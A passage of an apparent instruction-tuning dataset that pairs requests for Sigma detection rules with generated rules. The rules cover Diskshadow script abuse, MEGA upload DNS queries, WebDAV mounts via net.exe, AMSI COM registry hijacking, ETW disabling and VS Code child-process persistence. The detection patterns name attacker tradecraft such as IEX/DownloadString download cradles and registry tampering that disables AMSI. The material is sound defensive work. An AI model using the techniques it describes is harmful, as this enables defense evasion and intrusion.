      "answer": "In order to detect using Diskshadow.exe to execute arbitrary code in text file, you should: focus on monitoring process creation events within Windows environments. Specifically, look for instances where the process name ends with '\\diskshadow.exe' and the command line includes either '/s' or '-s' parameters. These characteristics are indicative of attempts to use the Diskshadow utility, a legitimate Windows tool, for malicious purposes such as executing arbitrary code through scripts. It is important to capture the command line arguments in the logs for further analysis. Be mindful that in environments where Diskshadow is used for legitimate backup processes by administrators, these indicators may lead to false positives. The severity of this detection is considered high due to the potential misuse of the Diskshadow tool for executing unauthorized code."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS queries for subdomains used for upload to MEGA.io.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS queries for subdomains used for upload to MEGA.io, you should focus on monitoring Windows DNS client activities. Specifically, keep an eye on Microsoft-Windows-DNS Client Events/Operational Event Log, making sure it is enabled and collected. The critical piece of information to look out for is Event ID 3008, especially when it's associated with queries containing the domain 'userstorage.mega.co.nz'. This activity might indicate an attempt to use the MEGA.io service potentially for exfiltrating sensitive data. However, it is crucial to remember that there could be legitimate reasons for accessing MEGA, and such interactions might not always signify malicious intent. Nonetheless, given that this activity is flagged with a high level of concern, it's vital to investigate and contextualize any such occurrences to determine their nature accurately. This detection strategy aligns with understanding tactics and techniques related to initial access, command and control, and exfiltration.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: dns-client\n    definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events.'\ndetection:\n    selection:\n        EventID: 3008\n        QueryName|contains: 'userstorage.mega.co.nz'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Mega\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: dns-client\n    definition: 'Requirements: Microsoft-Windows-DNS Client Events/Operational Event Log must be enabled/collected in order to receive the events.'\ndetection:\n    selection:\n        EventID: 3008\n        QueryName|contains: 'userstorage.mega.co.nz'\n    condition: selection\nfalsepositives:\n    - Legitimate DNS queries and usage of Mega\nlevel: high\n",
      "question": "DNS queries for subdomains used for upload to MEGA.io",
      "answer": "In order to detect DNS queries for subdomains used for upload to MEGA.io, you should focus on monitoring Windows DNS client activities. Specifically, keep an eye on Microsoft-Windows-DNS Client Events/Operational Event Log, making sure it is enabled and collected. The critical piece of information to look out for is Event ID 3008, especially when it's associated with queries containing the domain 'userstorage.mega.co.nz'. This activity might indicate an attempt to use the MEGA.io service potentially for exfiltrating sensitive data. However, it is crucial to remember that there could be legitimate reasons for accessing MEGA, and such interactions might not always signify malicious intent. Nonetheless, given that this activity is flagged with a high level of concern, it's vital to investigate and contextualize any such occurrences to determine their nature accurately. This detection strategy aligns with understanding tactics and techniques related to initial access, command and control, and exfiltration."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an internet hosted webdav share is mounted using the \"net.exe\" utility.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an internet hosted webdav share is mounted using the \"net.exe\" utility, you should: Monitor process creation events on Windows systems for the execution of \"net.exe\" or \"net1.exe\". Specifically, check for occurrences where the process image ends with '\\net.exe' or '\\net1.exe', and also verify the OriginalFileName attribute for these exact names. Furthermore, examine the command line arguments looking for instances containing ' use ' or ' http', as these are indicative of attempts to access or mount a webdav share over the internet. All of these conditions must be met simultaneously for an alert to be generated. Bear in mind that there might be legitimate uses of these commands that could trigger false positives, although no specific common false positive scenarios have been identified. The severity level for this detection is considered high due to the potential misuse of the net utility for mounting unauthorized or malicious webdav shares.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' use '\n            - ' http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' use '\n            - ' http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "when an internet hosted webdav share is mounted using the \"net.exe\" utility",
      "answer": "In order to detect when an internet hosted webdav share is mounted using the \"net.exe\" utility, you should: Monitor process creation events on Windows systems for the execution of \"net.exe\" or \"net1.exe\". Specifically, check for occurrences where the process image ends with '\\net.exe' or '\\net1.exe', and also verify the OriginalFileName attribute for these exact names. Furthermore, examine the command line arguments looking for instances containing ' use ' or ' http', as these are indicative of attempts to access or mount a webdav share over the internet. All of these conditions must be met simultaneously for an alert to be generated. Bear in mind that there might be legitimate uses of these commands that could trigger false positives, although no specific common false positive scenarios have been identified. The severity level for this detection is considered high due to the potential misuse of the net utility for mounting unauthorized or malicious webdav shares."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email, you should monitor logs from the threat management service, specifically targeting the Microsoft 365 platform. Focus on identifying events where the SecurityComplianceCenter is the event source. Specifically, look for the event named 'User restricted from sending email' with a status marked as success. This indicates a successful action where a user has been restricted due to exceeding sending limits, aligning with security compliance policies. Be aware that it might be challenging to distinguish between genuine policy violations and benign activities that trigger similar alerts, as there could be unknown factors leading to false positives. The severity of this activity is considered medium, suggesting it requires attention to mitigate potential security or compliance issues.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'User restricted from sending email'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'User restricted from sending email'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email.",
      "answer": "In order to detect when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email, you should monitor logs from the threat management service, specifically targeting the Microsoft 365 platform. Focus on identifying events where the SecurityComplianceCenter is the event source. Specifically, look for the event named 'User restricted from sending email' with a status marked as success. This indicates a successful action where a user has been restricted due to exceeding sending limits, aligning with security compliance policies. Be aware that it might be challenging to distinguish between genuine policy violations and benign activities that trigger similar alerts, as there could be unknown factors leading to false positives. The severity of this activity is considered medium, suggesting it requires attention to mitigate potential security or compliance issues."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the AMSI come server registry key in order disable AMSI scanning functionalities. When AMSI attempts to starts its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the AMSI COM server registry key in order to disable AMSI scanning functionalities. When AMSI attempts to start its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless, you should: Monitor Windows registry set operations, focusing on events where the registry value is being set (EventType: SetValue) to track changes. Concentrate on registry modifications targeting the specific path ending with '\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\(Default)', which is crucial for AMSI's COM server initialization. Exclude any instances where these modifications are setting the registry's target object to the legitimate AMSI DLL path ('%windir%\\system32\\amsi.dll'), as these changes do not represent the attack scenario of interest. This detection strategy requires vigilance in monitoring for registry alterations that deviate from the genuine AMSI DLL path, ensuring the early identification of attempts to disable AMSI scanning functionalities. Recognizing such unauthorized modifications is vital, as they can lead to a scenario where Windows fails to load the correct AMSI COM component during scanning operations, severely compromising system security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\(Default)'\n    filter:\n        Details: '%windir%\\system32\\amsi.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\(Default)'\n    filter:\n        Details: '%windir%\\system32\\amsi.dll'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "changes to the AMSI come server registry key in order disable AMSI scanning functionalities. When AMSI attempts to starts its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless",
      "answer": "In order to detect changes to the AMSI COM server registry key in order to disable AMSI scanning functionalities. When AMSI attempts to start its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless, you should: Monitor Windows registry set operations, focusing on events where the registry value is being set (EventType: SetValue) to track changes. Concentrate on registry modifications targeting the specific path ending with '\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32\\(Default)', which is crucial for AMSI's COM server initialization. Exclude any instances where these modifications are setting the registry's target object to the legitimate AMSI DLL path ('%windir%\\system32\\amsi.dll'), as these changes do not represent the attack scenario of interest. This detection strategy requires vigilance in monitoring for registry alterations that deviate from the genuine AMSI DLL path, ensuring the early identification of attempts to disable AMSI scanning functionalities. Recognizing such unauthorized modifications is vital, as they can lead to a scenario where Windows fails to load the correct AMSI COM component during scanning operations, severely compromising system security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll, you should: Look for modifications within the Windows Registry specifically targeting the setting values. Monitor registry events categorized under the setting changes, particularly focusing on those with the EventType of SetValue. The attention should be on changes made to the TargetObject ending with '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'. You need to be vigilant for modifications detailed as either 'DWORD (0x00000000)' or 'DWORD (0x00000002)', which represent the action of disabling or disabling with exceptions, respectively. This analysis is predicated on observations in the Windows environment, specifically noting registry modification events. The tagging relevant to this activity encompasses tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by manipulating the registry to disable critical logging functions. Be aware that detections based on this method are categorized at a low level due to the potential unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'\n        Details:\n            # This is disabled by default for some reason\n            - 'DWORD (0x00000000)' # Off\n            - 'DWORD (0x00000002)' # Off with exceptions\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'\n        Details:\n            # This is disabled by default for some reason\n            - 'DWORD (0x00000000)' # Off\n            - 'DWORD (0x00000002)' # Off with exceptions\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll",
      "answer": "In order to detect changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll, you should: Look for modifications within the Windows Registry specifically targeting the setting values. Monitor registry events categorized under the setting changes, particularly focusing on those with the EventType of SetValue. The attention should be on changes made to the TargetObject ending with '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'. You need to be vigilant for modifications detailed as either 'DWORD (0x00000000)' or 'DWORD (0x00000002)', which represent the action of disabling or disabling with exceptions, respectively. This analysis is predicated on observations in the Windows environment, specifically noting registry modification events. The tagging relevant to this activity encompasses tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by manipulating the registry to disable critical logging functions. Be aware that detections based on this method are categorized at a low level due to the potential unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting registry value with specific intentional typo and strings seen used by the Small Sieve malware.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect registry value with specific intentional typo and strings seen used by the Small Sieve malware, you should: Focus on the Windows operating system's registry settings, particularly those modifications categorized under registry settings. Essential to this detection strategy is monitoring for events where registry values are being set, especially paying attention to changes within the '\\Microsoft\\Windows\\CurrentVersion\\Run\\' registry path. This path is critical because it's often used by malware to achieve persistence by ensuring the malicious software starts every time the system boots. The detection should specifically look for two distinct indicators of compromise. First, watch for registry values being created or modified with the deliberate typo \"Microsift,\" a tactic used to evade simple keyword detection mechanisms while mimicking legitimate Microsoft products. Second, identify registry values associated with executable files, especially those containing the string '.exe Platypus.' This particular string suggests the manipulation of registry values to execute malware specifically identified as the Small Sieve through its distinctive naming convention. It is imperative to treat every detection at this level with high importance due to the low likelihood of false positives, indicating a high confidence that such detections are indeed malicious activities rather than benign system or user actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_path:\n        EventType: SetValue\n        TargetObject|contains: '\\Microsoft\\Windows\\CurrentVersion\\Run\\'\n    selection_value:\n        - TargetObject|contains: 'Microsift'\n        - Details|contains: '.exe Platypus'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_path:\n        EventType: SetValue\n        TargetObject|contains: '\\Microsoft\\Windows\\CurrentVersion\\Run\\'\n    selection_value:\n        - TargetObject|contains: 'Microsift'\n        - Details|contains: '.exe Platypus'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "registry value with specific intentional typo and strings seen used by the Small Sieve malware",
      "answer": "In order to detect registry value with specific intentional typo and strings seen used by the Small Sieve malware, you should: Focus on the Windows operating system's registry settings, particularly those modifications categorized under registry settings. Essential to this detection strategy is monitoring for events where registry values are being set, especially paying attention to changes within the '\\Microsoft\\Windows\\CurrentVersion\\Run\\' registry path. This path is critical because it's often used by malware to achieve persistence by ensuring the malicious software starts every time the system boots. The detection should specifically look for two distinct indicators of compromise. First, watch for registry values being created or modified with the deliberate typo \"Microsift,\" a tactic used to evade simple keyword detection mechanisms while mimicking legitimate Microsoft products. Second, identify registry values associated with executable files, especially those containing the string '.exe Platypus.' This particular string suggests the manipulation of registry values to execute malware specifically identified as the Small Sieve through its distinctive naming convention. It is imperative to treat every detection at this level with high importance due to the low likelihood of false positives, indicating a high confidence that such detections are indeed malicious activities rather than benign system or user actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks or terminal profiles..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process, which could indicate an attempt of persistence via VsCode tasks or terminal profiles, you should: Monitor the creation of processes on Windows systems, specifically focusing on any instance where \"code.exe\" initiates the creation of child processes. Be particularly vigilant for child processes such as \"calc.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"cscript.exe\", and \"wscript.exe\", which are commonly associated with legitimate system functions but can be repurposed for malicious activity. Additionally, pay attention to command-line interfaces like \"powershell.exe\", \"pwsh.exe\", and \"cmd.exe\" when they execute commands that include \"Invoke-Expressions\", \"IEX\", \"Invoke-Command\", \"ICM\", \"DownloadString\", \"rundll32\", \"regsvr32\", \"wscript\", and \"cscript\", as these could be indicators of scripts being run for download or execution of malicious payloads. Furthermore, scrutinize the paths from which these child processes are initiated, with specific focus on directories commonly exploited for temporary file storage and execution by adversaries, such as \"C:\\Users\\Public\\\", \"C:\\Windows\\Temp\\\", and \"C:\\Temp\\\". It's crucial to handle potential false positives carefully, particularly in development environments where Visual Studio Code is used extensively and tasks may legitimately compile or execute various types of code that could falsely trigger these detections. The sensitivity of this monitoring should be set to a medium level, balancing the need to detect potential intrusions against the risk of generating excessive false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\code.exe'\n    selection_children_images:\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    selection_children_cli:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n        CommandLine|contains:\n            - 'Invoke-Expressions'\n            - 'IEX'\n            - 'Invoke-Command'\n            - 'ICM'\n            - 'DownloadString'\n            - 'rundll32'\n            - 'regsvr32'\n            - 'wscript'\n            - 'cscript'\n    selection_children_paths:\n        Image|contains:\n            # Add more suspicious locations\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\Temp\\'\n    condition: selection_parent and 1 of selection_children_*\nfalsepositives:\n    - In development environment where VsCode is used heavily. False positives may occur when developers use task to compile or execute different types of code. Remove or add processes accordingly\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\code.exe'\n    selection_children_images:\n        Image|endswith:\n            - '\\calc.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    selection_children_cli:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n        CommandLine|contains:\n            - 'Invoke-Expressions'\n            - 'IEX'\n            - 'Invoke-Command'\n            - 'ICM'\n            - 'DownloadString'\n            - 'rundll32'\n            - 'regsvr32'\n            - 'wscript'\n            - 'cscript'\n    selection_children_paths:\n        Image|contains:\n            # Add more suspicious locations\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\Temp\\'\n    condition: selection_parent and 1 of selection_children_*\nfalsepositives:\n    - In development environment where VsCode is used heavily. False positives may occur when developers use task to compile or execute different types of code. Remove or add processes accordingly\nlevel: medium\n",
      "question": "uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process. This could indicate an attempt of persistence via VsCode tasks or terminal profiles.",
      "answer": "In order to detect uncommon or suspicious child processes spawning from a VsCode \"code.exe\" process, which could indicate an attempt of persistence via VsCode tasks or terminal profiles, you should: Monitor the creation of processes on Windows systems, specifically focusing on any instance where \"code.exe\" initiates the creation of child processes. Be particularly vigilant for child processes such as \"calc.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"cscript.exe\", and \"wscript.exe\", which are commonly associated with legitimate system functions but can be repurposed for malicious activity. Additionally, pay attention to command-line interfaces like \"powershell.exe\", \"pwsh.exe\", and \"cmd.exe\" when they execute commands that include \"Invoke-Expressions\", \"IEX\", \"Invoke-Command\", \"ICM\", \"DownloadString\", \"rundll32\", \"regsvr32\", \"wscript\", and \"cscript\", as these could be indicators of scripts being run for download or execution of malicious payloads. Furthermore, scrutinize the paths from which these child processes are initiated, with specific focus on directories commonly exploited for temporary file storage and execution by adversaries, such as \"C:\\Users\\Public\\\", \"C:\\Windows\\Temp\\\", and \"C:\\Temp\\\". It's crucial to handle potential false positives carefully, particularly in development environments where Visual Studio Code is used extensively and tasks may legitimately compile or execute various types of code that could falsely trigger these detections. The sensitivity of this monitoring should be set to a medium level, balancing the need to detect potential intrusions against the risk of generating excessive false positives."
    }
  }
]